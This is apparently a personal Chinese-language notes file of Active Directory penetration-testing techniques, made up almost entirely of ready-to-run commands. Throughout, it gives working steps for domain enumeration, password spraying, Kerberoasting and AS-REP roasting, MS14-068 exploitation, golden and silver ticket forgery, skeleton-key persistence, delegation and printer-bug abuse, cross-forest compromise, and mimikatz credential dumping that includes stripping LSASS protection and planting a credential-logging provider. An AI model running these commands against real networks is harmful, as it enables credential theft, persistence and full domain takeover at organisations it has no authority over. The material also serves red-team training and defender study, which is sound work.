# Hunting-Active-Directory
个人整理的一些域渗透Tricks，可能有一些错误。
## 信息收集


- 常用命令
```cpp
Net use
Net view
Tasklist /v
Ipconfig /all 
net group /domain 获得所有域用户组列表
net group "domain admins" /domain 获得域管理员列表
net group "enterprise admins" /domain 获得企业管理员列表
net localgroup administrators /domain 获取域内置administrators组用户（enterprise admins、domain admins）
net group "domain controllers" /domain 获得域控制器列表
net group "domain computers" /domain 获得所有域成员计算机列表
net user /domain 获得所有域用户列表
net user someuser /domain 获得指定账户someuser的详细信息
net accounts /domain 获得域密码策略设置，密码长短，错误锁定等信息
nltest /domain_trusts 获取域信任信息
```

- SPN扫描
```cpp
setspn -T target.com -Q */*
```
## 

- 定位域控
```cpp
若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。
nslookup -type=all _ldap._tcp.dc._msdcs.rootkit.org


ipconfig /all
端口:88,389,53
```

- 定位域管登录的机器
```cpp
powerpick Find-DomainUserLocation -UserIdentity Administrator  #查看用户位置
Get-UserEvent
powerpick Invoke-EventHunter #查看日志
```
## 数据搜集
### 基础信息
```cpp
# List shares on the local host
net share

# List network computers
net view

# List shares on a remote PC
net view COMPUTER_NAME /all
```
```cpp
# List shares on the local host
wmic share get /format:list

# List shares on a remote PC
wmic /node: COMPUTER_NAME share get
```

- 搜索域内跟文件相关的计算机名
```cpp
# List all domain computers and filter all computers with “FILE” in their name
net group "Domain Computers" /domain | findstr "FILE"
```

- powerview  
[Cheat sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
```cpp
Find-DomainShare
Get-DomainFileServer
```


### 数据库信息
#### [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
[https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/](https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/)

- 信息收集
```cpp
# Find all local SQL instances:
Get-SQLInstanceLocal -Verbose

# Find all SQL instances across a domain/network:
Get-SQLInstanceDomain -Verbose
Get-SQLInstanceBroadcast -Verbose
Get-SQLInstanceScanUDP -Verbose
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1611489894586-d1b59747-a3d3-444e-b89e-b44d5bfb2114.png#align=left&display=inline&height=510&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1020&originWidth=1760&size=199052&status=done&style=none&width=880)


- 获得详细信息
```cpp
# Enumerate basic information about local SQL instances
Get-SQLInstanceLocal | Get-SQLServerInfo

# Enumerate basic information about a remote SQL instance
Get-SQLServerInfo -Instance "Srv-Web-Kit.rootkit.org"
```

- 利用!
```cpp
列出当前用户能登录的实例
Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
 
尝试获取实例admin权限
Invoke-SQLEscalatePriv -Verbose -Instance "COMPUTER_NAME"
    
使用默认密码枚举
Get-SQLInstanceDomain -Verbose | Get-SQLServerLoginDefaultPw -Verbose

Dump数据库信息
Invoke-SQLDumpInfo -Verbose -Instance "COMPUTER_NAME"

使用自动审计
Invoke-SQLAudit -Verbose -Instance "COMPUTER_NAME"
   
    
敏感信息
Import-Module PowerUpSQL.psd1
$Servers = Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
$Accessible = $Servers | Where-Object {$_.Status –eq “Accessible”}
$Accessible | Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize 
----
Get-SQLColumnSampleData –Verbose –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults  –Instance "Server1\Instance1"

```

- SqlClient in cobaltstrike(also use in lateral movement)  
[sqlclient in github](https://github.com/FortyNorthSecurity/SqlClient)
![image](https://user-images.githubusercontent.com/30458572/116821806-ee431e00-abad-11eb-8808-76ba273195a3.png)

### 定位用户
```cpp
# Find where a specific user is logged in using Powerview:
Find-DomainUserLocation -UserIdentity USER_NAME

# Find where a group of users are logged in using Powerview:
Find-DomainUserLocation -UserGroupIdentity GROUP_NAME

或者使用sharpsniper,需要admin密码

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential $Cred -MaxEvents 1000
```
### [MailSniper](https://github.com/dafthack/MailSniper)
[https://github.com/dafthack/MailSniper](https://github.com/dafthack/MailSniper)


如果有一个用户的密码,可以查看他的收件箱
```cpp
# Autodiscover the target Exchange server and search user@example.com’s mailbox
Invoke-SelfSearch -OutputCsv local-results.csv -Mailbox user@example.com

# Specify a remote Exchange server (Exchange Online in this case) and search user@example.com’s mailbox
Invoke-SelfSearch -Remote -ExchHostname outlook.office365.com -OutputCsv local-results.csv -Mailbox user@example.com


```




## UserHunting
[http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)


## 域内漏洞扫描
[https://github.com/hausec/ADAPE-Script](https://github.com/hausec/ADAPE-Script)


```cpp
powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
```
PS: 这个脚本的动作很大,和血犬差不多,会有大规模的请求,所有模块都要从github下载,而且需要管理员权限,适合授权测试的时候在线下渗透使用,ETC.
主要扫描以下以下漏洞:
```cpp
•通过WPAD，LLMNR和NBT-NS欺骗收集Hash

•MS14-025

•通过Kerberoast收集帐户的Hash

•通过BloodHound识别目标

•提权检测

•搜索网络上的开放SMB共享

•搜索smb共享中的敏感字符串

•检查网络上的系统补丁

•搜索文件服务器

•搜索附件

•收集域策略
```


一键扫描
```cpp
Set-ExecutionPolicy Bypass ./ADAPE.ps1 -All
```
或者指定模块
```cpp
./ADAPE.ps1 -GPP -PView -Kerberoast
```
## SPN扫描
```
.\StandIn.exe --spn
```
## 域内爆破
[https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)


先爆用户用名,不过一般就可以直接查得到
```cpp
./kerbrute_darwin_amd64 userenum -d rootkit.org user.txt
```

- 获取收集的密码,批量爆一波,域内密码可以找强弱口令和多做信息收集
```cpp
./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
```




## [BloodHound](https://github.com/BloodHoundAD/BloodHound)使用


一键搜集信息
[https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
```cpp
Import-Module .\SharpHound.ps1


Invoke-Bloodhound -Verbose -Domain 'domain.local' -DomainController 'DC01.domain.local' -LDAPUser 'targetuser' -LDAPPass 'targetpass' -CollectionMethod  all
```
最佳查询实践
[https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json)
[https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/F%20-%20BloodHound](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/tree/master/F%20-%20BloodHound)

- Using BloodHound without collectors (ldapsearch stuff)  
[Using Bloodhound in Linux environments](https://www.errno.fr/BloodhoundForLinux.html)

## SPN扫描到Kerberoasting


- 优先级1:rubeus请求,hashcat爆破
```cpp
 .\Rubeus.exe kerberoast
 hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
```




- 扫描SPN服务
```
https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
setspn -T 0day.org -q */*
```
或者
```cpp
 GetUserSPNs.py 
```

- 客户端请求server端,爆破获得ST票据
```cpp
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/Srv-Web-Kit.rootkit.org" 
```

- 导出ticket
```cpp
kerberos::list /export 
```
kerberoast爆破
[https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)




- 或者使用[Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921#diff-d214854c3756868714d19040048ea71c65102d43911fb99ad6ff568bd930bd05)
```cpp
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast
```
会返回所有信息
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1610207139166-24f631ce-fcc6-48eb-bc54-22de06381190.png#align=left&display=inline&height=643&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1286&originWidth=1762&size=388398&status=done&style=none&width=881)
或者指定寻找高权限用户
```cpp
Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
```


hashcat破解
```cpp
hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
```


## 域内MS14-068提权
### Pykek


来源:[https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068.md](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-MS14-068.md)


MS14-068对应的补丁为KB3011780，可在域控上通过systeminfo查看是否安装此补丁。
Pykek工具利用漏洞
```
MS14-068.exe
```
```
MS14-068.exe -u sqladmin@0day.org -p admin!@#45 -s S-1-5-21-1812960810-2335050734-3517558805-1142 -d OWA2010SP3.0day.org
```


-u 域账号+@+域名称，这里是jerry+@+rootkit.org


-p 为当前用户的密码，即jerry的密码


-s为jerry的SID值，可以通过whoami/all来获取用户的SID值


-d为当前域的域控
脚本执行成功会在当前目录下生成一个ccache文件。


利用:
```
mimikatz
klist purge
kerberos::ptc TGT_sqladmin@0day.org.ccache
```
访问域控:
```
dir \\OWA2010SP3.0day.org\c$
```
### goldenPac.exe


```
goldenPac.exe 0day.org/sqladmin:admin!@#45@OWA2010SP3.0day.org
```


![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1610208075109-ea675ce6-a7e6-4090-ac7c-5df850145562.png#align=left&display=inline&height=258&margin=%5Bobject%20Object%5D&name=image.png&originHeight=515&originWidth=749&size=62430&status=done&style=none&width=374.5)
## 域内权限维持
### Kerberoasting的后门利用
来自:[https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)
在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令
例如为域用户`Administrator`添加`SPNVNC/DC1.test.com`，参数如下：
```cpp
setspn.exe -U -A VNC/DC1.test.com Administrator
```


在域内任意一台主机都能获得该SPN，并且能够使用Kerberoast获得TGS，如下图
再使用hashcat破解即可
删除SPN的参数如下：
```
setspn.exe -D VNC/DC1.test.com Administrator
```
### GoldenTicket
[https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.md](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.md)


金票的生成需要用到krbtgt的密码HASH值
```
lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt
```
得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。
```
参数说明：

/admin：伪造的用户名

/domain：域名称

/sid：SID值，注意是去掉最后一个-后面的值

/krbtgt：krbtgt的HASH值

/ticket：生成的票据名称
```
SID是红框部分
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1610208282886-efa3fd09-348e-45cb-a7d4-e956275e6bae.png#align=left&display=inline&height=499&margin=%5Bobject%20Object%5D&name=image.png&originHeight=998&originWidth=1770&size=151757&status=done&style=none&width=885)
```
kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi
```
mimikatz导入利用
```
kerberos::purge
kerberos::ptt golden.kiribi
kerberos::list
```
### SilverTickets
制作银票的条件：



```
1.域名称
2.域的SID值
3.域的服务账户的密码HASH（不是krbtgt，是域控）
4.伪造的用户名，可以是任意用户名，这里是silver
```
利用过程
```
首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH
```
```
sekurlsa::logonpasswords
```
这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。


参数说明：
```
/domain：当前域名称
/sid：SID值，和金票一样取前面一部分
/target：目标主机，这里是OWA2010SP3.0day.org
/service：服务名称，这里需要访问共享文件，所以是cifs
/rc4：目标主机的HASH值
/user：伪造的用户名
/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
```

/
```
kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt
```
### 使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据




如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 EnterpriseAdmins组权限[RID=519]（域林中的最高权限）的票据。


然后通过mimikatz重新生成包含根域SID的新的金票
Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间。


```
Step 1. 获取根域的sid(powerview module): Convert-NameToSid uknowsec.cn\krbtgt 
Step 2. kerberos::golden /admin:administrator /domain:news.uknowsec.cn /sid:XXX(Child-DomainSid) /sids:XXX-519(填入刚刚获取到的根域SID, RID=519为Enterprise Admins组) /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt
```


### MImikatz万能钥匙
```
privilege::debug
misc::skeleton
```




## Kerberos Bronze Bit Attack - CVE-2020-17049


## Exchange漏洞利用
## 各种Relay
## 委派攻击


### 信息收集
查询三种委派信息
```
StandIn.exe --delegation
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1610248566809-f78550f0-906f-4726-b5c5-2a5f68001884.png#align=left&display=inline&height=610&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1220&originWidth=1802&size=213590&status=done&style=none&width=901)

- 或者powerview
```
非约束委派
通过Import-Module PowerView.ps1加载PowerView脚本之后使用下面的命令进行查询。

查询域中配置非约束委派的账户：

Get-NetUser -Unconstrained -Domain rootkit.org
查询域中配置非约束委派的主机：

Get-NetComputer -Unconstrained -Domain rootkit.org
约束委派
查询域中配置约束委派的账户：

Get-DomainUser -TrustedToAuth -Domain rootkit.org
查询域中配置约束委派的主机:

Get-DomainComputer -TrustedToAuth -Domain rootkit.org
```
### 非约束委派攻击利用
如果我们在启用了无限制委派的计算机上具有管理员访问权限，我们可以等待高价值的目标或DA连接到它，窃取他的TGT，然后ptt攻击.


[https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation.md](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation.md)
#### Mimikatz
```
在域中只有服务账户才能有委派功能，所以先把用户sqladmin设置为服务账号。

setspn -U -A variant/golden sqladmin
```
查看配置成功与否
```
setspn -l sqladmin
```
然后在“AD用户和计算机”中将sqladmin设置为非约束委派模式
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1610249133911-90243271-5ca7-4dd9-b393-a7c9cb2c5b43.png#align=left&display=inline&height=910&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1820&originWidth=2302&size=848309&status=done&style=none&width=1151)


```
在域控上使用Administrator访问sqladmin所在主机Srv-Web-Kit的SMB服务。

dir \\Srv-Web-Kit.rootkit.org\c$
```
然后在Srv-Web-Kit上面导出ticket,ptt即可.后续利用就和之前一样.
```cpp
psexec.exe \\dc -s cmd.exe
```
```
每当存在用户访问tsvc的服务时，tsvc的服务就会将访问者的TGT保存在内存中，可以通过这个TGT访问这个TGT所属用户的所有服务。
```
#### PowerView
```
#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay   
<WaitInterval> -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```
#### Rubeus


```cpp
powershell-import /opt/Tools/lab10/powerview-dev.ps1
powerpick Get-DomainComputer -Unconstrained #找到对应用户和服务
execute-assembly /opt/Tools/lab10/rubeus.exe monitor /interval:1 #监控域内请求,抓取凭据
DNS_SERVER=${PROXYRESOLV_DNS:-10.0.2.200} #设置proxy的dns解析,指向应该是域控的ip.或者有打印服务的机器
cd /opt/Tools/lab10/krbrelayx
. ./venv/bin/activate
#利用打印服务漏洞主动发起请求
proxychains python printerbug.py -hashes :659de2671ddd13848b8a511e97893da6 ironbank.local/arya.stark@dc.ironbank.local workstation.ironbank.local
#PTT
execute-assembly /opt/Tools/lab10/rubeus.exe ptt /ticket:<base64 ticket>
dcsync ironbank.local ironbank\administrato
```
用完记得jobkill


### 约束委派攻击利用


- 寻找约束委派的用户和服务
```go
powerpick Get-DomainComputer -TrustedToAuth
StandIn.exe --delegation
```
#### 


- 清空缓存
```go
execute-assembly /opt/Tools/lab10/rubeus.exe purge
```
#### Rubeus一步到位
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1610250930759-7a6a05ed-d9ec-4376-8109-c51d0dea6099.png#align=left&display=inline&height=792&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1584&originWidth=1996&size=542368&status=done&style=none&width=998)
rc4这个参数,密码或者hash要自己本地提权才能获得了.是前提条件

- 生成rc4
```cpp
Rubeus.exe  hash /user:xxx /pasword:xxx /domain:xx.xx
```
这里的伪造的用户名必须是域内已经有的，比如adminstrator。
所以这里本机的这个用户是伪造成其他用户去从获取TGS。
另外:该用户的hash的也要看能不能获取
```cpp
Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service's SPN>" /altservice:<Optional> /ptt

demo
execute-assembly /opt/Tools/lab10/rubeus.exe s4u /impersonateuser:administrator /msdsspn:"ldap/dc" /altservice:cifs /dc:dc.ironbank.local /user:FILESERVER$ /rc4:<NTLM HASH for FILESERVER$> /ptt
```
```cpp
Rubeus.exe s4u /user:wing /rc4:xxxxxxxx /impersonateuser:administrator /msdsspn:cifs/mssql.pentestlab.com /altservice:cifs /ptt

ls \\dc\C$ #希望能成功QAQ
```




> 现在，我们可以模拟用户访问该服务！
> 

> 如果我们仅对特殊的SPN拥有委派权，该怎么办？ （例如，TIME）：
> 

> 在这种情况下，我们仍然可以滥用Kerberos的一种功能，即替代服务。 这使我们能够为其他“替代”服务而不只是我们有权获得的服务请求TGS门票。 这样一来，我们就可以利用杠杆来请求主机希望获得的任何服务的有效票证，从而使我们可以完全控制目标计算机。





### 基于资源的约束委派利用




## 使用Mimikatz解密Credentials
Usually encrypted credentials are stored in:


- %appdata%\Microsoft\Credentials
- %localappdata%\Microsoft\Credentials



```
#通过使用mimikatz的cred函数，我们可以枚举cred对象并获取有关它的信息：
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

#在前面的命令中，我们对“ guidMasterKey”参数很感兴趣，该参数告诉我们使用了哪个主密钥对凭据进行加密
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"

#现在，如果我们处于凭据要登录的用户（或系统）的上下文中，则可以使用/rpc标志将主密钥的解密传递给域控制器：
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc

#现在，我们的本地缓存中有了masterKey：
dpapi::cache

#解密:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```
## 将管理员权限的TGT授给其他非管理员的机器
[https://www.anquanke.com/post/id/162606](https://www.anquanke.com/post/id/162606)
```cpp
你可以用Rubeus的 tgtdeleg 功能提取当前用户的 TGT，并将其和 /autorenew 标志一起传递给运行在另一台主机上的 Rubeus 的 renew 函数。这将允许你在不提权的情况下提取当前用户的凭证，并在另一台主机上进行最多7天（默认）的续订。

我们仅使用票证而不是帐户的哈希来执行攻击。
```
```cpp
Rubeus.exe tgtdeleg /nowrap
```
## 跨林攻击
Trust Tickets
```cpp
如果我们在与另一个林具有双向信任关系的域上具有域管理员权限，则可以获取“信任”密钥并伪造我们自己的跨域TGT。

注意:我们将具有的访问权限将限于我们的DA帐户在其他Forest中配置的权限！
```

- 使用Mimikatz：
```cpp
#Dump the trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#使用Golden Ticket攻击建立跨域TGT
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid: /
<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
<PathToSaveTheGoldenTicket>"' #ticket要是.kribi
```
```cpp
然后，使用TGT向外部森林索取TGS以获取任何服务，并访问资源！
```

- 使用Rubeus：
```cpp
.\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
```
## 打破林信任-攻击其他林
```cpp
如果我们与外部林具有双向信任，并且我们设法破坏了启用了无限制委派的本地林上的计算机（默认情况下，DC具有此权限），则可以使用printerbug强制将外部林的根域的DC设置为 向我们认证。 然后，我们可以捕获它的TGT，将其注入内存中，并使用DCsync来转储其哈希值，从而可以对整个林进行完全访问。
```
```cpp
#监控TGT请求:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#利用打印服务漏洞
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#得到Ticket注入内存
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#dump其他域的hash:
lsadump::dcsync /domain:external.forest.local /all 
```
## 域内横向控制Lateral Movement
### Powershell Remoting
```cpp
#Enable Powershell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```
### Remote Code Execution with PS Credentials
```cpp
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```
### Import a powershell module and execute its functions remotely
```cpp
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 

#Interact with the session
Enter-PSSession -Session $sess
```
### Executing Remote Stateful commands


```cpp
#Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```
### Mimikatz


如果mimikatz由于LSA保护而未能Dump凭据怎么办？
到目前为止，我知道两种解决方法：

- LSA as a Protected Process
```cpp
#通过查看变量RunAsPPL是否设置为0x1来检查LSA是否作为受保护的进程运行
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

#接下来将mimidriver.sys从官方mimikatz存储库上传到mimikatz.exe的同一文件夹
#现在将mimidriver.sys导入系统
mimikatz # !+

#Now lets remove the protection flags from lsass.exe process
mimikatz # !processprotect /process:lsass.exe /remove

#Finally run the logonpasswords function to dump lsass
mimikatz # sekurlsa::logonpasswords
```


- LSA作为凭据进程的虚拟化进程（LSAISO）运行



```cpp
#Check if a process called lsaiso.exe exists on the running processes
tasklist |findstr lsaiso

＃如果确实没有办法转储lsass，我们将只获得加密的数据。 但是我们仍然可以使用键盘记录器或剪贴板转储器来捕获数据。
＃让我们将自己的恶意安全支持提供程序注入内存，在此示例中，我将使用mimikatz提供的
mimikatz # misc::memssp

#＃现在将登录到此计算机的每个用户会话和身份验证，并将捕获纯文本凭据并将其存储到c:\windows\system32\mimilsa.log
```




```cpp
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#列出内存中的票据
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```
```cpp
视频中学到一个
查看有没有密码
mimikatz !lsadump::secrets

make_token user password
然后就直接拥有对应用户权限
net computer
ls \\dc\\C$

```
## 域内本地提权
### SharpAddMachine
[https://github.com/Ridter/SharpAddDomainMachine](https://github.com/Ridter/SharpAddDomainMachine)


```cpp
.\SharpAddDomainMachine.exe domain=rootkit.org dc=owa2013.rootkit.org tm=SRV-WEB-KIT
```


然后实战中利用隧道执行以下命令即可
```cpp
getST.py -dc-ip owa2013.rootkit.org rootkit.org/4B23BBXE$:21XILFD07C -spn cifs/SRV-WEB-KIT.rootkit.org -impersonate administrator

export KRB5CCNAME=administrator.ccache

psexec.py rootkit.org/administrator@SRV-WEB-KIT.rootkit.org -k -no-pass
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1610258170540-a48b6298-2797-4061-8bdd-c7b93e97b15e.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1788&size=143880&status=done&style=none&width=894)
### Zerologon

- MImikatz
- [https://github.com/rsmudge/ZeroLogon-BOF](https://github.com/rsmudge/ZeroLogon-BOF)
- [https://github.com/mstxq17/cve-2020-1472](https://github.com/mstxq17/cve-2020-1472)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/370919/1611593013233-7a01b256-b6d8-4f74-b34e-6ac6c4269488.png#align=left&display=inline&height=207&margin=%5Bobject%20Object%5D&name=image.png&originHeight=414&originWidth=540&size=182838&status=done&style=none&width=270)
## asreproasting离线爆破域用户密码
[https://www.anquanke.com/post/id/85374](https://www.anquanke.com/post/id/85374)


- 检查没有设置kerberos预身份验证的用户
```go
powerpick Get-DomainUser -PreauthNotRequired
```
- Use with impacket script
```go
getNPUsers.py
```

存在的话.利用rubeus自动生成离线hash
```go
rubeus.exe asrepoast /user:test /outfile:C:\windows\temp\testhash.txt /format:hashcat
```
hashcat 破解
```go
hashcat -m 18200 -a 0 /tmp/testrst.exe wordlist.txt --force
```


## GPP漏洞-MS14-025


```cpp
findstr /S cpassword \\test.org\sysvol\*.xml

Net-GPPPassword.exe 一键搞定
make_token user pass
```
## LAPS
[http://drops.xmd5.com/static/drops/tips-10496.html](http://drops.xmd5.com/static/drops/tips-10496.html)


这玩意是用来定期更换密码的.


> LAPS（Local Administrator Password Solution，本地管理员密码解决方案）是微软发布的一款用来在LDAP上存储本地管理员密码的工具。只要一切都配置正确，那么该工具使用起来将非常不错。然而，如果你没有正确地设置LDAP属性的权限，那么可能会将本地管理员凭证暴露给域内的所有用户。

```cpp
Exploting LAPS
rev2self
powershell-import /opt/Tools/lab10/LAPSToolkit.ps1
powerpick Get-LAPSComputers
powerpick Find-LAPSDelegatedGroups
make_token IRONBANK\jon.snow PASSWORD
powershell-import /opt/Tools/lab10/powerview-dev.ps1
powerpick Get-DomainObject Workstation -Properties ms-mcs-admpwd
spawnas .\administrator <password> http

C2-FrameWork/Empire/data/module_source/credentials/Get-LAPSPasswords.ps1
```


## ADFS利用


[https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you](https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you)


## 组策略利用GPO
[https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
## ACL攻击
[https://stealthbits.com/blog/attacking-active-directory-permissions-with-bloodhound/](https://stealthbits.com/blog/attacking-active-directory-permissions-with-bloodhound/)
[https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)


[https://github.com/fox-it/Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)
usage:
```cpp
.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync
.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe
